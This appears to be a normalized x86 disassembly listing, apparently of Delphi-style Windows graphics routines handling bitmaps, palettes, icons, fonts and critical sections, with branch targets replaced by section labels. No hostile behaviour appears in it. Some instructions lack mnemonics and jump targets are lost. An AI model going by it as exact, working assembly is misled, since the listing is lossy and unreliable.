push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_418984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423976
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a3a
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40c7f0
call sub_420698
jmp r-xdata
sub_423976
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_402754
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_423a3a
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402b78
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_423acf
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_420e9c
mov [ ebp - 0x30 ] eax
sub_423aec
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4234a0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_423b30
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_423230
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_418984
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402b78
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4234a0
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_4235c8
call sub_420698
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_423ba0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_423230
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402b78
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_422848
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_423c3b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4234a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423c64
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_4230ec
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_423230
mov eax esi
call sub_423340
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_423230
mov eax esi
call sub_423340
mov eax esi
call sub_4231bc
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_422848
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_422c4c
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4234a0
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4234a0
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_4221e4
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423d9c
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_423240
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_422c4c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423df0
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_423240
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_422c4c
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423e70
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_423230
mov eax ebx
call sub_423240
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_4221e4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423f07
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4234a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4220dc
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41e764
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_423f0c
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403900
call sub_403954
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_4220dc
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423f44
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_423240
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_422c4c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_423fa0
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b78
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4231bc
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_4215d8
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_4189bc
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_4189bc
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402b78
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_423080
mov dl [ r-xdata ]
call sub_420494
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_4207ac
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_422198
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_4189bc
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_4189bc
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_4189bc
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_4189bc
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_4189bc
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_4189bc
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_420c1c
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_4189bc
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_420f40
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_424260
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_423240
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_4221e4
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_4242da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_422848
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_424300
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_424348
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_421914
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_422010
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42439c
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_422014
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417090
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_4243cc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_4246a4
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_422010
mov eax [ esi + 0x28 ]
call sub_422014
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4170bc
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_42442c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_420494
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_424484
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_4244c0
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_418778
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_418984
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_4211ec
jmp r-xdata
jmp r-xdata
call sub_4206a4
sub_424538
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4245c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_424484
cmp eax [ rw-data ]
jne r-xdata
call sub_4206a4
mov eax esi
call sub_424484
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_421718
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402b78
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_4189bc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4245ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42467a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_418758
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_418984
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_418984
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4246a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4206a4
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42467f
mov eax [ ebp - 0x4 ]
call sub_403164
call sub_403900
call sub_403954
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4246a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4246e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_422010
mov eax [ ebx + 0x28 ]
call sub_422014
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_424764
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_424538
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_4189bc
pop esi
pop ebx
retn
sub_4247b4
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_420cec
mov [ rw-data ] eax
pop ebx
retn
sub_4247ec
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_424830
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4247ec
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_4248fc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_424934
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax esi
call sub_424b2c
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_424978
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424960
xor eax eax
push ebp
push sub_424a19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a20
mov eax [ ebp - 0x4 ]
call sub_42496c
retn
mov eax 0x10
call sub_402734
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424a2c
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_424a2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_424b0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_423080
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41fddc
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41fcc0
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4156e4
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_420064
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_420378
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_422d3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424b2c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_424960
xor eax eax
push ebp
push sub_424b77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b7e
